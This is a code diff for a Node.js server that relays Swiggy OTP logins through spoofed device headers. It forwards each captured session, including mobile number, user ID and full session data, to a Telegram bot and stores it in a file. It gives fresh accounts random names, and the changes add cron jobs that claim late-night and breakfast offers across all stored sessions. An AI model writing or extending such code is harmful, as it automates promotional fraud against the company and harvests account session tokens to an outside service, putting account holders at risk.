@@ -22,15 +22,21 @@ const SESSIONS_FILE = path.join(__dirname, 'sessions.json');
 
 if (!fs.existsSync(SESSIONS_FILE)) fs.writeFileSync(SESSIONS_FILE, '[]');
 
-// Schedule Night Claimer (11:30 PM IST)
-cron.schedule('30 23 * * *', () => {
-    console.log('[] Scheduled Night Claimer running...');
-    claimOffers();
+// 1. LATE NIGHT OFFER CLAIMER: Daily 5:00 PM IST (Before 6 PM deadline)
+cron.schedule('0 17 * * *', () => {
+    console.log('[⏰] 5:00 PM: Late Night Offer Claimer running...');
+    claimOffers('late-night');
+}, { timezone: "Asia/Kolkata" });
+
+// 2. BREAKFAST OFFER CLAIMER: Daily 12:30 AM IST (Between 12 AM - 1 AM window)
+cron.schedule('30 0 * * *', () => {
+    console.log('[⏰] 12:30 AM: Breakfast Offer Claimer running...');
+    claimOffers('breakfast');
 }, { timezone: "Asia/Kolkata" });
 
 async function sendToTelegram(sessionData) {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const message = `*NEW SWIGGY SESSION*\n\n📱 *Mobile:* \`${sessionData.mobile}\`\n *User ID:* \`${sessionData.userid}\`\n⏰ *Generated:* ${new Date().toLocaleString()}\n\n📄 *Session Data:*\n\`\`\`json\n${JSON.stringify(sessionData, null, 2)}\n\`\`\``;
+    const message = `*NEW SWIGGY SESSION*\n\n📱 *Mobile:* \`${sessionData.mobile}\`\n🆔 *User ID:* \`${sessionData.userid}\`\n⏰ *Generated:* ${new Date().toLocaleString()}\n\n📄 *Session Data:*\n\`\`\`json\n${JSON.stringify(sessionData, null, 2)}\n\`\`\``;
     const payload = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };
 
     try {
@@ -38,29 +44,20 @@ async function sendToTelegram(sessionData) {
         console.log(`[+] Session sent to Telegram for ${sessionData.mobile}`);
     } catch (err) { console.error(`[-] Telegram send failed: ${err.message}`); }
 
-    // Save to file (Prevent Duplicates)
     try {
         let sessions = JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf8'));
-        
-        // Check if mobile number already exists
         const existingIndex = sessions.findIndex(s => s.mobile === sessionData.mobile);
-        
-        sessionData.claimed = false;
+        sessionData.claimedLateNight = false;
+        sessionData.claimedBreakfast = false;
         sessionData.nameSet = false;
 
         if (existingIndex !== -1) {
-            // Update existing session instead of creating duplicate
             sessions[existingIndex] = sessionData;
-            console.log(`[+] Updated existing session for ${sessionData.mobile}`);
         } else {
-            // Add new session
             sessions.push(sessionData);
-            console.log(`[+] Added new session for ${sessionData.mobile}`);
         }
-        
         fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions, null, 2));
         
-        // Auto set random name for fresh accounts
         const newName = await updateProfileName(sessionData);
         if (newName) {
             sessionData.name = newName;
@@ -96,10 +93,8 @@ function buildHeaders(deviceId) {
 app.get('/api/otp', async (req, res) => {
     const phone = req.query.mobile;
     if (!phone || !/^\d{10}$/.test(phone)) return res.json({ statusCode: -1, statusMessage: "Invalid phone" });
-
     const devId = genHex(8);
     const headers = buildHeaders(devId);
-
     try {
         const resp = await fetch(`https://profile.swiggy.com/api/v3/app/sms_otp?mobile=${phone}`, { method: 'GET', headers });
         const data = await resp.json();
@@ -144,19 +139,19 @@ app.post('/api/verify', async (req, res) => {
     } catch (err) { res.json({ statusCode: -1, statusMessage: err.message }); }
 });
 
-// Debug route to check saved sessions
 app.get('/api/check-sessions', (req, res) => {
     try {
         const sessions = JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf8'));
-        const unclaimed = sessions.filter(s => !s.claimed).length;
+        const unclaimedLN = sessions.filter(s => !s.claimedLateNight).length;
+        const unclaimedBF = sessions.filter(s => !s.claimedBreakfast).length;
         res.json({ 
             status: "success",
             total_sessions: sessions.length,
-            unclaimed_sessions: unclaimed,
-            last_saved_mobile: sessions.length > 0 ? sessions[sessions.length - 1].mobile : "None"
+            unclaimed_late_night: unclaimedLN,
+            unclaimed_breakfast: unclaimedBF
         });
     } catch (err) {
-        res.json({ status: "error", message: "No sessions saved yet or file empty" });
+        res.json({ status: "error", message: "No sessions saved yet" });
     }
 });
 
